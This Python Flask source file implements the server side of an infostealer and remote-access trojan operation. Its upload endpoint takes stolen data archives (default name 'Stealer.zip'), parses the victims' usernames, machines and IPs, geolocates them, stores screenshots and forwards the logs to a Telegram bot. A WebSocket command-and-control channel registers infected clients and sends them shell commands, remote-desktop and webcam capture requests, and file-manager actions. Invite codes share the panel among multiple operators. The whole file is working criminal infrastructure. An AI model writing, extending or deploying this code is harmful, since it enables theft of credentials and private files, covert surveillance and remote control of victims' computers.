import os
import json
import secrets
import sqlite3
import time
import zipfile
import requests
from datetime import datetime, timedelta
from functools import wraps
import base64
import threading
import queue
from flask import Flask, request, jsonify, send_from_directory, send_file, session, Response
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
from flask_sock import Sock

app = Flask(__name__, static_folder='public')
sock = Sock(app)

# In-memory frame storage for Remote Desktop & Webcam
rdp_frames = {}
rdp_frames_lock = threading.Lock()
camera_frames = {}
camera_frames_lock = threading.Lock()
camera_devices = {}
camera_devices_lock = threading.Lock()
terminal_results = {}
terminal_results_lock = threading.Lock()
tasklist_results = {}
tasklist_results_lock = threading.Lock()
fm_results = {}
fm_results_lock = threading.Lock()

# WebSocket connected clients: client_id -> {ws, hostname, username, ip, user_id}
ws_clients = {}
ws_clients_lock = threading.Lock()
ws_error_log = []

# Paths setup
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DATA_DIR = '/data' if os.path.isdir('/data') else BASE_DIR
DB_PATH = os.path.join(DATA_DIR, 'database.db')
UPLOADS_DIR = os.path.join(DATA_DIR, 'uploads')
LOGS_DIR = os.path.join(UPLOADS_DIR, 'logs')
SCREENSHOTS_DIR = os.path.join(UPLOADS_DIR, 'screenshots')

for d in [LOGS_DIR, SCREENSHOTS_DIR]:
    os.makedirs(d, exist_ok=True)

# Flask session secret key (persistent across restarts)
SECRET_KEY_FILE = os.path.join(DATA_DIR, '.flask_secret')
if os.path.exists(SECRET_KEY_FILE):
    with open(SECRET_KEY_FILE, 'r') as f:
        app.secret_key = f.read().strip()
else:
    app.secret_key = secrets.token_hex(32)
    with open(SECRET_KEY_FILE, 'w') as f:
        f.write(app.secret_key)

app.permanent_session_lifetime = timedelta(days=30)
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max upload

# --- Database ---
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as db:
        db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                role TEXT DEFAULT 'user',
                api_key TEXT UNIQUE NOT NULL,
                is_banned INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        db.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                username TEXT,
                hostname TEXT,
                os TEXT,
                cpu TEXT,
                ram INTEGER,
                ip TEXT,
                date_time TEXT,
                file_count INTEGER,
                zip_filename TEXT,
                has_screenshot INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        cursor = db.execute("PRAGMA table_info(users)")
        user_cols = [row['name'] for row in cursor.fetchall()]
        if 'ban_reason' not in user_cols:
            db.execute("ALTER TABLE users ADD COLUMN ban_reason TEXT")

        db.execute('''
            CREATE TABLE IF NOT EXISTS audit_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                admin_username TEXT,
                action TEXT,
                details TEXT,
                ip TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        db.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        db.execute('''
            CREATE TABLE IF NOT EXISTS invites (
                code TEXT PRIMARY KEY,
                created_by INTEGER,
                used_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                used_at TIMESTAMP
            )
        ''')

        db.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                client_id TEXT PRIMARY KEY,
                user_id INTEGER,
                hostname TEXT,
                username TEXT,
                ip TEXT,
                last_heartbeat TIMESTAMP,
                pending_command TEXT
            )
        ''')

        cursor = db.execute("PRAGMA table_info(clients)")
        client_cols = [row['name'] for row in cursor.fetchall()]
        if 'user_id' not in client_cols:
            db.execute("ALTER TABLE clients ADD COLUMN user_id INTEGER")

        for k, v in [
            ('tg_forward_enabled', 'false'), ('tg_bot_token', ''), ('tg_chat_id', ''),
            ('active_bg_theme', 'theme-default'), ('bg_blur_value', '15'), ('custom_bg_path', '')
        ]:
            db.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', (k, v))
        db.commit()

init_db()

def get_real_client_ip():
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    return request.remote_addr or '127.0.0.1'

def log_audit(action, details):
    try:
        current_u = getattr(request, 'current_user', None) or get_current_user()
        admin_id = current_u['id'] if current_u else None
        admin_username = current_u['username'] if current_u else 'System'
        ip = get_real_client_ip()
        with get_db() as db:
            db.execute(
                'INSERT INTO audit_logs (admin_id, admin_username, action, details, ip) VALUES (?, ?, ?, ?, ?)',
                (admin_id, admin_username, action, details, ip)
            )
            db.commit()
    except Exception as e:
        print(f"[Audit Log Error] {e}")

# --- Auth helpers ---
def get_current_user():
    user_id = session.get('user_id')
    if not user_id:
        return None
    with get_db() as db:
        user = db.execute('SELECT * FROM users WHERE id = ?', (user_id,)).fetchone()
    if user and user['is_banned']:
        session.clear()
        return None
    return user

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        user = get_current_user()
        if not user:
            return jsonify({'error': 'Unauthorized'}), 401
        request.current_user = user
        return f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        user = get_current_user()
        if not user:
            return jsonify({'error': 'Unauthorized'}), 401
        if user['role'] != 'admin':
            return jsonify({'error': 'Admin access required'}), 403
        request.current_user = user
        return f(*args, **kwargs)
    return decorated

# --- Helpers ---
def parse_info_text(content):
    info = {
        'username': 'Unknown', 'hostname': 'Unknown', 'os': 'Unknown',
        'cpu': 'Unknown', 'ram': 0, 'ip': 'Unknown', 'date_time': ''
    }
    for line in content.split('\n'):
        line = line.strip()
        if line.startswith('User: '): info['username'] = line[6:].strip()
        elif line.startswith('Machine: '): info['hostname'] = line[9:].strip()
        elif line.startswith('OS: '): info['os'] = line[4:].strip()
        elif line.startswith('CPU Name: '): info['cpu'] = line[10:].strip()
        elif line.startswith('RAM Total (MB): '):
            try: info['ram'] = int(line[16:].strip())
            except: pass
        elif line.startswith('Internal IP: '):
            val = line[13:].strip()
            if info['ip'] in ['Unknown', 'unavailable', '127.0.0.1', '::1']:
                info['ip'] = val
        elif line.startswith('IP: '): info['ip'] = line[4:].strip()
        elif line.startswith('Now: '): info['date_time'] = line[5:].strip()
    return info

def get_country_code(ip):
    if not ip or ip in ['127.0.0.1', '::1', 'Unknown', 'unavailable']:
        return ''
    try:
        r = requests.get(f"https://ip2c.org/{ip}", timeout=3)
        if r.status_code == 200:
            parts = r.text.split(';')
            if len(parts) >= 2 and parts[0] == '1':
                return parts[1]
    except Exception as e:
        print(f"[GeoIP] Error: {e}")
    return ''

def forward_to_telegram(zip_path, filename, info):
    try:
        with get_db() as db:
            enabled = db.execute('SELECT value FROM settings WHERE key = ?', ('tg_forward_enabled',)).fetchone()
            if not enabled or enabled['value'] != 'true':
                return
            token = db.execute('SELECT value FROM settings WHERE key = ?', ('tg_bot_token',)).fetchone()
            chat_id = db.execute('SELECT value FROM settings WHERE key = ?', ('tg_chat_id',)).fetchone()

        if not token or not token['value'] or not chat_id or not chat_id['value']:
            return

        ram_str = f"{round(info['ram'] / 1024)} GB" if info['ram'] >= 1024 else (f"{info['ram']} MB" if info['ram'] > 0 else "Unknown")
        caption = (
            f"New Log Received!\n\n"
            f"User: {info['username']}\n"
            f"Machine: {info['hostname']}\n"
            f"IP: {info['ip']}\n"
            f"OS: {info['os']}\n"
            f"RAM: {ram_str}\n"
            f"Time: {info['date_time'] or datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )

        url = f"https://api.telegram.org/bot{token['value']}/sendDocument"
        with open(zip_path, 'rb') as f:
            files = {'document': (filename, f, 'application/zip')}
            data = {'chat_id': chat_id['value'], 'caption': caption, 'parse_mode': 'HTML'}
            requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        print(f"[TG Forward] Error: {e}")

# ===== AUTH ROUTES =====

@app.route('/api/auth/check')
def auth_check():
    with get_db() as db:
        user_count = db.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    if user_count == 0:
        return jsonify({'authenticated': False, 'needsSetup': True})
    user = get_current_user()
    if user:
        return jsonify({
            'authenticated': True,
            'user': {
                'id': user['id'],
                'username': user['username'],
                'role': user['role'],
                'api_key': user['api_key']
            }
        })
    return jsonify({'authenticated': False, 'needsSetup': False})

@app.route('/api/auth/register', methods=['POST'])
def auth_register():
    data = request.json
    username = (data.get('username') or '').strip()
    password = data.get('password') or ''
    invite_code = (data.get('invite_code') or '').strip()

    if not username or len(username) < 3:
        return jsonify({'error': 'Username must be at least 3 characters'}), 400
    if len(password) < 4:
        return jsonify({'error': 'Password must be at least 4 characters'}), 400

    api_key = secrets.token_hex(16)

    with get_db() as db:
        user_count = db.execute('SELECT COUNT(*) FROM users').fetchone()[0]
        is_first_user = user_count == 0

        if not is_first_user:
            if not invite_code:
                return jsonify({'error': 'Invitation code is required'}), 400
            invite = db.execute('SELECT * FROM invites WHERE code = ? AND used_by IS NULL', (invite_code,)).fetchone()
            if not invite:
                return jsonify({'error': 'Invalid or already used invitation code'}), 403

        role = 'admin' if is_first_user else 'user'

        existing = db.execute('SELECT id FROM users WHERE username = ?', (username,)).fetchone()
        if existing:
            return jsonify({'error': 'Username already taken'}), 400

        password_hash = generate_password_hash(password)
        cursor = db.execute(
            'INSERT INTO users (username, password_hash, role, api_key) VALUES (?, ?, ?, ?)',
            (username, password_hash, role, api_key)
        )
        user_id = cursor.lastrowid

        if not is_first_user:
            db.execute('UPDATE invites SET used_by = ?, used_at = CURRENT_TIMESTAMP WHERE code = ?', (user_id, invite_code))

        db.commit()

    if not get_current_user():
        session.permanent = True
        session['user_id'] = user_id

    return jsonify({
        'success': True,
        'user': {'id': user_id, 'username': username, 'role': role, 'api_key': api_key}
    })

@app.route('/api/auth/login', methods=['POST'])
def auth_login():
    data = request.json
    username = (data.get('username') or '').strip()
    password = data.get('password') or ''
    remember = data.get('remember', False)

    with get_db() as db:
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()

    if not user or not check_password_hash(user['password_hash'], password):
        return jsonify({'error': 'Invalid username or password'}), 401

    if user['is_banned']:
        reason = user['ban_reason'] if user['ban_reason'] else 'No reason specified'
        return jsonify({'error': f'Your account has been frozen/banned. Reason: {reason}'}), 403

    session.permanent = bool(remember)
    session['user_id'] = user['id']

    log_audit('LOGIN', f"User '{user['username']}' (ID #{user['id']}) logged in successfully")

    return jsonify({
        'success': True,
        'user': {
            'id': user['id'],
            'username': user['username'],
            'role': user['role'],
            'api_key': user['api_key']
        }
    })

@app.route('/api/auth/logout', methods=['POST'])
def auth_logout():
    session.clear()
    return jsonify({'success': True})

# ===== STATIC ROUTES =====

@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/login')
def login_page():
    return send_from_directory(app.static_folder, 'login.html')

@app.route('/uploads/<path:path>')
def serve_uploads(path):
    return send_from_directory(UPLOADS_DIR, path)

@app.route('/<path:path>')
def static_proxy(path):
    return send_from_directory(app.static_folder, path)

# ===== UPLOAD (public, keyed by api_key) =====

@app.route('/api/upload', methods=['POST'])
def upload_log():
    try:
        api_key = request.headers.get('x-panel-key') or request.form.get('secret_key') or ''
        api_key = api_key.strip()

        owner_id = None
        with get_db() as db:
            if api_key:
                owner = db.execute('SELECT id, is_banned FROM users WHERE api_key = ?', (api_key,)).fetchone()
                if owner:
                    if owner['is_banned']:
                        return jsonify({'error': 'Account banned'}), 403
                    owner_id = owner['id']
                else:
                    return jsonify({'error': 'Invalid API key'}), 403
            else:
                return jsonify({'error': 'API key required'}), 403

        file = request.files.get('document')
        if not file:
            return jsonify({'error': 'No file uploaded'}), 400

        timestamp = int(time.time() * 1000)
        orig_filename = secure_filename(file.filename) or 'Stealer.zip'
        base, ext = os.path.splitext(orig_filename)
        filename = f"{base}_{timestamp}{ext}"
        zip_path = os.path.join(LOGS_DIR, filename)
        file.save(zip_path)

        info = {
            'username': 'Unknown', 'hostname': 'Unknown', 'os': 'Unknown',
            'cpu': 'Unknown', 'ram': 0,
            'ip': request.remote_addr or 'Unknown',
            'date_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        has_screenshot = 0
        file_count = 0

        with zipfile.ZipFile(zip_path, 'r') as zf:
            namelist = zf.namelist()
            file_count = len(namelist)

            if 'Information.txt' in namelist:
                with zf.open('Information.txt') as info_file:
                    content = info_file.read().decode('utf-8', errors='ignore')
                    info = parse_info_text(content)
                    if info['ip'] in ['unavailable', '127.0.0.1', '::1', 'Unknown']:
                        info['ip'] = request.remote_addr or 'Unknown'

            if 'screenshot.jpg' in namelist:
                screenshot_filename = f"{base}_{timestamp}.jpg"
                with open(os.path.join(SCREENSHOTS_DIR, screenshot_filename), 'wb') as sf:
                    sf.write(zf.read('screenshot.jpg'))
                has_screenshot = 1

        country_code = get_country_code(info['ip'])

        with get_db() as db:
            existing = db.execute(
                'SELECT id, zip_filename, has_screenshot FROM logs WHERE username = ? AND hostname = ? AND user_id = ?',
                (info['username'], info['hostname'], owner_id)
            ).fetchone()

            if existing:
                old_zip_path = os.path.join(LOGS_DIR, existing['zip_filename'])
                if os.path.exists(old_zip_path):
                    try: os.remove(old_zip_path)
                    except: pass
                if existing['has_screenshot']:
                    old_base, _ = os.path.splitext(existing['zip_filename'])
                    old_sc_path = os.path.join(SCREENSHOTS_DIR, f"{old_base}.jpg")
                    if os.path.exists(old_sc_path):
                        try: os.remove(old_sc_path)
                        except: pass

                db.execute('''
                    UPDATE logs SET
                        os = ?, cpu = ?, ram = ?, ip = ?, date_time = ?,
                        file_count = ?, zip_filename = ?, has_screenshot = ?, country_code = ?, created_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                ''', (info['os'], info['cpu'], info['ram'], info['ip'], info['date_time'],
                      file_count, filename, has_screenshot, country_code, existing['id']))
                log_id = existing['id']
            else:
                cursor = db.execute('''
                    INSERT INTO logs (user_id, username, hostname, os, cpu, ram, ip, date_time, file_count, zip_filename, has_screenshot, country_code)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (owner_id, info['username'], info['hostname'], info['os'], info['cpu'], info['ram'],
                      info['ip'], info['date_time'], file_count, filename, has_screenshot, country_code))
                log_id = cursor.lastrowid
            db.commit()

        forward_to_telegram(zip_path, filename, info)
        return jsonify({'success': True, 'id': log_id})
    except Exception as e:
        print(f"[API] Upload Error: {e}")
        return jsonify({'error': str(e)}), 500

# ===== STATS =====

@app.route('/api/stats')
@login_required
def get_stats():
    try:
        user = request.current_user
        uid = user['id']
        is_admin = (user['role'] == 'admin')

        with get_db() as db:
            today_str = datetime.now().strftime('%Y-%m-%d') + '%'
            if is_admin:
                total_logs = db.execute('SELECT COUNT(*) FROM logs').fetchone()[0]
                logs_today = db.execute('SELECT COUNT(*) FROM logs WHERE created_at LIKE ?', (today_str,)).fetchone()[0]
                unique_ips = db.execute('SELECT COUNT(DISTINCT ip) FROM logs').fetchone()[0]
                os_stats = db.execute('SELECT os, COUNT(*) as count FROM logs GROUP BY os ORDER BY count DESC LIMIT 5').fetchall()
            else:
                total_logs = db.execute('SELECT COUNT(*) FROM logs WHERE (user_id = ? OR user_id IS NULL)', (uid,)).fetchone()[0]
                logs_today = db.execute('SELECT COUNT(*) FROM logs WHERE (user_id = ? OR user_id IS NULL) AND created_at LIKE ?', (uid, today_str)).fetchone()[0]
                unique_ips = db.execute('SELECT COUNT(DISTINCT ip) FROM logs WHERE (user_id = ? OR user_id IS NULL)', (uid,)).fetchone()[0]
                os_stats = db.execute('SELECT os, COUNT(*) as count FROM logs WHERE (user_id = ? OR user_id IS NULL) GROUP BY os ORDER BY count DESC LIMIT 5', (uid,)).fetchall()

            os_list = [{'os': r['os'], 'count': r['count']} for r in os_stats]

        return jsonify({
            'totalLogs': total_logs, 'logsToday': logs_today,
            'uniqueIps': unique_ips, 'osStats': os_list
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===== LOGS =====

@app.route('/api/logs')
@login_required
def get_logs():
    try:
        user = request.current_user
        uid = user['id']
        is_admin = (user['role'] == 'admin')

        page = int(request.args.get('page', 1))
        limit = int(request.args.get('limit', 15))
        search = request.args.get('search', '')
        offset = (page - 1) * limit

        if is_admin:
            base_filter = '1=1'
            base_params = []
        else:
            base_filter = '(user_id = ? OR user_id IS NULL)'
            base_params = [uid]

        if search:
            like_expr = f"%{search}%"
            search_filter = '(username LIKE ? OR hostname LIKE ? OR os LIKE ? OR ip LIKE ?)'
            search_params = [like_expr] * 4
            where = f' WHERE {base_filter} AND {search_filter}'
            params = base_params + search_params
        else:
            where = f' WHERE {base_filter}'
            params = base_params

        query = f'SELECT * FROM logs{where} ORDER BY id DESC LIMIT ? OFFSET ?'
        count_query = f'SELECT COUNT(*) FROM logs{where}'

        with get_db() as db:
            logs_rows = db.execute(query, params + [limit, offset]).fetchall()
            total = db.execute(count_query, params).fetchone()[0]

        logs = [dict(r) for r in logs_rows]
        return jsonify({
            'logs': logs, 'total': total, 'page': page,
            'totalPages': max(1, (total + limit - 1) // limit)
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def _get_log_for_current_user(db, log_id, user):
    if user['role'] == 'admin':
        return db.execute('SELECT * FROM logs WHERE id = ?', (log_id,)).fetchone()
    return db.execute('SELECT * FROM logs WHERE id = ? AND (user_id = ? OR user_id IS NULL)', (log_id, user['id'])).fetchone()

@app.route('/api/logs/<int:log_id>')
@login_required
def get_log_details(log_id):
    try:
        user = request.current_user

        with get_db() as db:
            log_row = _get_log_for_current_user(db, log_id, user)

        if not log_row:
            return jsonify({'error': 'Log not found'}), 404

        log = dict(log_row)

        zip_path = os.path.join(LOGS_DIR, log['zip_filename'])
        if not os.path.exists(zip_path):
            return jsonify({'error': 'ZIP file not found'}), 404

        file_param = request.args.get('file')

        if file_param:
            TEXT_EXTENSIONS = {
                '.txt', '.log', '.json', '.xml', '.csv', '.ini', '.cfg', '.conf',
                '.html', '.htm', '.css', '.js', '.ts', '.py', '.md', '.yaml', '.yml',
                '.toml', '.sql', '.sh', '.bat', '.cmd', '.ps1', '.env', '.gitignore'
            }
            with zipfile.ZipFile(zip_path, 'r') as zf:
                if file_param not in zf.namelist():
                    return jsonify({'error': 'File not found in archive'}), 404
                zinfo = zf.getinfo(file_param)
                _, ext = os.path.splitext(file_param.lower())
                if ext in TEXT_EXTENSIONS or zinfo.file_size < 500000:
                    raw = zf.read(file_param)
                    try:
                        content = raw.decode('utf-8')
                        return jsonify({'type': 'text', 'content': content, 'size': zinfo.file_size})
                    except UnicodeDecodeError:
                        pass
                return jsonify({'type': 'binary', 'size': zinfo.file_size, 'content': None})

        files = []
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for zinfo in zf.infolist():
                files.append({'name': zinfo.filename, 'size': zinfo.file_size})
            if log.get('has_screenshot') and 'screenshot.jpg' in zf.namelist():
                try:
                    sc_raw = zf.read('screenshot.jpg')
                    log['screenshot_b64'] = f"data:image/jpeg;base64,{base64.b64encode(sc_raw).decode('utf-8')}"
                except Exception:
                    pass

        if not log.get('screenshot_b64') and log.get('has_screenshot'):
            sc_filename = log['zip_filename'].replace('.zip', '.jpg')
            sc_path = os.path.join(SCREENSHOTS_DIR, sc_filename)
            if os.path.exists(sc_path):
                try:
                    with open(sc_path, 'rb') as scf:
                        log['screenshot_b64'] = f"data:image/jpeg;base64,{base64.b64encode(scf.read()).decode('utf-8')}"
                except Exception:
                    pass

        return jsonify({'log': log, 'files': files})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/<int:log_id>/screenshot')
@login_required
def get_log_screenshot(log_id):
    try:
        user = request.current_user
        with get_db() as db:
            log_row = _get_log_for_current_user(db, log_id, user)
        if not log_row:
            return jsonify({'error': 'Log not found'}), 404
        log = dict(log_row)
        zip_path = os.path.join(LOGS_DIR, log['zip_filename'])
        if os.path.exists(zip_path):
            with zipfile.ZipFile(zip_path, 'r') as zf:
                if 'screenshot.jpg' in zf.namelist():
                    return Response(zf.read('screenshot.jpg'), mimetype='image/jpeg')
        sc_filename = log['zip_filename'].replace('.zip', '.jpg')
        sc_path = os.path.join(SCREENSHOTS_DIR, sc_filename)
        if os.path.exists(sc_path):
            return send_file(sc_path, mimetype='image/jpeg')
        return jsonify({'error': 'Screenshot not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/<int:log_id>/download')
@login_required
def download_log(log_id):
    try:
        user = request.current_user

        with get_db() as db:
            log = _get_log_for_current_user(db, log_id, user)
        if not log:
            return jsonify({'error': 'Log not found'}), 404

        zip_path = os.path.join(LOGS_DIR, log['zip_filename'])
        if not os.path.exists(zip_path):
            return jsonify({'error': 'ZIP file not found'}), 404

        filename = log['zip_filename']
        if not filename.lower().endswith('.zip'):
            filename = f"{filename}.zip"

        return send_file(
            zip_path,
            mimetype='application/zip',
            as_attachment=True,
            download_name=filename
        )
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/logs/<int:log_id>', methods=['DELETE'])
@login_required
def delete_log(log_id):
    try:
        user = request.current_user

        with get_db() as db:
            log = _get_log_for_current_user(db, log_id, user)
            if not log:
                return jsonify({'error': 'Log not found'}), 404

            db.execute('DELETE FROM logs WHERE id = ?', (log_id,))
            db.commit()

        zip_path = os.path.join(LOGS_DIR, log['zip_filename'])
        if os.path.exists(zip_path):
            os.remove(zip_path)
        if log['has_screenshot']:
            base, _ = os.path.splitext(log['zip_filename'])
            sc_path = os.path.join(SCREENSHOTS_DIR, f"{base}.jpg")
            if os.path.exists(sc_path):
                os.remove(sc_path)

        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===== SETTINGS =====

@app.route('/api/settings')
@login_required
def get_settings():
    try:
        with get_db() as db:
            rows = db.execute('SELECT * FROM settings').fetchall()
        settings = {r['key']: r['value'] for r in rows}
        return jsonify(settings)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/settings', methods=['POST'])
@login_required
def save_settings():
    try:
        data = request.json
        with get_db() as db:
            for key in ['tg_forward_enabled', 'tg_bot_token', 'tg_chat_id', 'active_bg_theme', 'bg_blur_value', 'custom_bg_path']:
                if key in data:
                    db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, str(data[key])))
            db.commit()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/settings/background', methods=['POST'])
@login_required
def upload_background():
    try:
        if 'background' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        file = request.files['background']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400

        ext = os.path.splitext(secure_filename(file.filename))[1] or '.jpg'
        bg_filename = f"custom_bg_{int(time.time())}{ext}"
        bg_path = os.path.join(UPLOADS_DIR, bg_filename)
        file.save(bg_path)
        db_path_url = f"/uploads/{bg_filename}"

        with get_db() as db:
            db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('custom_bg_path', db_path_url))
            db.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('active_bg_theme', 'theme-custom'))
            db.commit()

        return jsonify({'success': True, 'custom_bg_path': db_path_url})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ===== C2 WEBSOCKET =====

@sock.route('/api/c2/ws')
def c2_websocket(ws):
    client_id = None
    try:
        raw = ws.receive(timeout=10)
        if not raw:
            return
        auth = json.loads(raw)
        if auth.get('type') != 'auth':
            return

        key = auth.get('key', '')
        client_id = auth.get('client_id', '')
        hostname = auth.get('hostname', '')
        username = auth.get('username', '')
        if not key or not client_id:
            return

        with get_db() as db:
            user = db.execute('SELECT id FROM users WHERE api_key = ?', (key,)).fetchone()
            if not user:
                return
        owner_id = user['id']

        ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        with get_db() as db:
            db.execute('''
                INSERT INTO clients (client_id, user_id, hostname, username, ip, last_heartbeat)
                VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
                ON CONFLICT(client_id) DO UPDATE SET
                    hostname = excluded.hostname, username = excluded.username,
                    ip = excluded.ip, last_heartbeat = CURRENT_TIMESTAMP
            ''', (client_id, owner_id, hostname, username, ip))
            db.commit()

        cmd_q = queue.Queue()

        with ws_clients_lock:
            ws_clients[client_id] = {
                'ws': ws, 'hostname': hostname, 'username': username,
                'ip': ip, 'user_id': owner_id, 'cmd_queue': cmd_q
            }

        ws.send(json.dumps({'type': 'auth_ok'}, separators=(',', ':')))

        last_ping = time.time()
        while True:
            # drain pending commands first
            while not cmd_q.empty():
                try:
                    ws.send(cmd_q.get_nowait())
                except queue.Empty:
                    break

            data = ws.receive(timeout=2)
            if data is None:
                if time.time() - last_ping > 25:
                    ws.send('{"type":"ping"}')
                    last_ping = time.time()
                continue
            if isinstance(data, bytes):
                if len(data) > 1 and data[0] == 0x43:  # 'C' = Camera
                    with camera_frames_lock:
                        camera_frames[client_id] = {'data': data[1:], 'ts': time.time()}
                else:
                    raw = data[1:] if (len(data) > 1 and data[0] == 0x53) else data
                    with rdp_frames_lock:
                        rdp_frames[client_id] = {'data': raw, 'ts': time.time()}
                continue
            msg = json.loads(data)
            if msg.get('type') == 'pong':
                continue
            if msg.get('type') == 'camera_list':
                with camera_devices_lock:
                    camera_devices[client_id] = msg.get('devices', [])
                continue
            if msg.get('type') in ('cmd_res', 'ps_res'):
                with terminal_results_lock:
                    terminal_results[client_id] = msg.get('output', '')
                continue
            if msg.get('type') == 'tasklist_res':
                with tasklist_results_lock:
                    tasklist_results[client_id] = msg.get('tasks', [])
                continue
            if msg.get('type') in ('fm_list_res', 'fm_download_res', 'fm_delete_res', 'fm_upload_res'):
                with fm_results_lock:
                    fm_results[client_id] = msg
                continue
            with get_db() as db:
                db.execute('UPDATE clients SET last_heartbeat = CURRENT_TIMESTAMP WHERE client_id = ?', (client_id,))
                db.commit()
    except Exception as e:
        import traceback
        ws_error_log.append({'client_id': client_id, 'error': str(e), 'tb': traceback.format_exc(), 'ts': time.time()})
        if len(ws_error_log) > 50:
            ws_error_log.pop(0)
    finally:
        if client_id:
            with ws_clients_lock:
                ws_clients.pop(client_id, None)


@app.route('/api/c2/debug')
def c2_debug():
    with ws_clients_lock:
        online = list(ws_clients.keys())
    with camera_devices_lock:
        cams = {k: v for k, v in camera_devices.items()}
    return jsonify({'online': online, 'camera_devices': cams, 'errors': ws_error_log[-10:]})


@app.route('/api/c2/clients', methods=['GET'])
@login_required
def c2_list_clients():
    user = request.current_user
    with get_db() as db:
        rows = db.execute('''
            SELECT client_id, hostname, username, ip, last_heartbeat, pending_command
            FROM clients WHERE user_id = ? ORDER BY last_heartbeat DESC
        ''', (user['id'],)).fetchall()
    clients = []
    with ws_clients_lock:
        for r in rows:
            clients.append({
                'client_id': r['client_id'],
                'hostname': r['hostname'],
                'username': r['username'],
                'ip': r['ip'],
                'last_heartbeat': r['last_heartbeat'],
                'pending_command': r['pending_command'],
                'is_online': r['client_id'] in ws_clients
            })
    return jsonify(clients)


@app.route('/api/c2/clients/<client_id>', methods=['DELETE'])
@login_required
def c2_delete_client(client_id):
    user = request.current_user
    with ws_clients_lock:
        if client_id in ws_clients:
            return jsonify({'error': 'client is online'}), 400
    with get_db() as db:
        db.execute('DELETE FROM clients WHERE client_id = ? AND user_id = ?', (client_id, user['id']))
        db.commit()
    return jsonify({'success': True})


@app.route('/api/c2/clients/offline', methods=['DELETE'])
@login_required
def c2_delete_offline_clients():
    user = request.current_user
    with ws_clients_lock:
        online_ids = set(ws_clients.keys())
    
    with get_db() as db:
        all_clients = db.execute('SELECT client_id FROM clients WHERE user_id = ?', (user['id'],)).fetchall()
        deleted_count = 0
        for c in all_clients:
            cid = c['client_id']
            if cid not in online_ids:
                db.execute('DELETE FROM clients WHERE client_id = ? AND user_id = ?', (cid, user['id']))
                deleted_count += 1
        db.commit()
    return jsonify({'success': True, 'deleted': deleted_count})


@app.route('/api/c2/command', methods=['POST'])
@login_required
def c2_send_command():
    user = request.current_user
    data = request.json or {}
    client_id = data.get('client_id', '')
    command = data.get('command', '')
    if not client_id or not command:
        return jsonify({'error': 'missing fields'}), 400

    with get_db() as db:
        client = db.execute('SELECT client_id FROM clients WHERE client_id = ? AND user_id = ?', (client_id, user['id'])).fetchone()
        if not client:
            return jsonify({'error': 'client not found'}), 404

    with ws_clients_lock:
        wsc = ws_clients.get(client_id)
    if not wsc:
        return jsonify({'error': 'client offline'}), 404

    wsc['cmd_queue'].put(json.dumps({'type': 'command', 'command': command}, separators=(',', ':')))
    if command.startswith('rdp_start'):
        with rdp_frames_lock:
            rdp_frames[client_id] = {'data': b'', 'ts': time.time()}
    elif command.startswith('camera_start'):
        with camera_frames_lock:
            camera_frames[client_id] = {'data': b'', 'ts': time.time()}
    return jsonify({'success': True})


# ===== REMOTE DESKTOP FRAME ENDPOINT =====

@app.route('/api/c2/frame/<client_id>')
@login_required
def c2_get_frame(client_id):
    user = request.current_user
    with rdp_frames_lock:
        frame = rdp_frames.get(client_id)
    if not frame:
        return '', 204

    try:
        last_ts = float(request.args.get('ts', 0))
    except (ValueError, TypeError):
        last_ts = 0

    if frame['ts'] <= last_ts:
        return '', 304

    return jsonify({
        'ts': frame['ts'],
        'b64': base64.b64encode(frame['data']).decode('ascii')
    })


